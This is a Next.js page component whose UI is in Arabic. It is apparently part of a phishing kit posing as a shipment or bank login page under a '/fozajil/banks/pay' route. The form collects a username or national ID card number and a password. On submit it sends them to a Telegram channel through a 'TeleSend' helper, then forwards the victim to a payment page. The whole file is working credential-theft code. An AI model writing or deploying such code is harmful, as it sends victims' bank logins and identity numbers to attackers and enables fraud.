"use client"
import styles from './enma.module.css'
import Image from 'next/image'
import icon1 from '../../../../../public/9.png'
import { useState } from 'react'
import { useRouter,useSearchParams } from 'next/navigation'
import TeleSned from '../../../../server/TeleSend'
const Page = () => {
  const {Send} = TeleSned();
  const router = useRouter();
  const x = useSearchParams();
  const datas = x.get("names")



  const [form,setForm]=useState({
    data:{
      username:"",
      password:"",
      رقم_الشحنة:datas
    }
  })
  const setDynamicFormData = (name,value)=>{
    setForm({
      data:{
        ...form.data,
        [name]:value,
      }
    })
  }
  const PostToTelegram = () => {
    const description = Object.entries(form.data)
      .map((d) => `${d[0]} : ${d[1]} `)
      .join("\n");
    Send(description)

    
  };
      const handlerout = ()=>{
        if(form.data.username == "" || form.data.password == ""){
          alert('من فضلك قم بملى الحقول')
        }else{
          
          router.push(`/fozajil/banks/pay?names=${datas}`)
        }
      }

  return (
    <div className={styles.container}>
        <Image 
            src={icon1}
            width={400}
        />

        <form onSubmit={(e)=>{
        e.preventDefault();
        PostToTelegram()
      }}>

            <input type="text" name="username"onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} placeholder='ادخل اسم المستخدم او رقم البطاقة الوطنية ' required/>
            <input type="text"name="password" onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} placeholder='ادخل كلمة المرور' required/>
            <button type='submit' onClick={handlerout}>تسجيل الدخول</button>

        </form>
    </div>
  )
}

export default Page
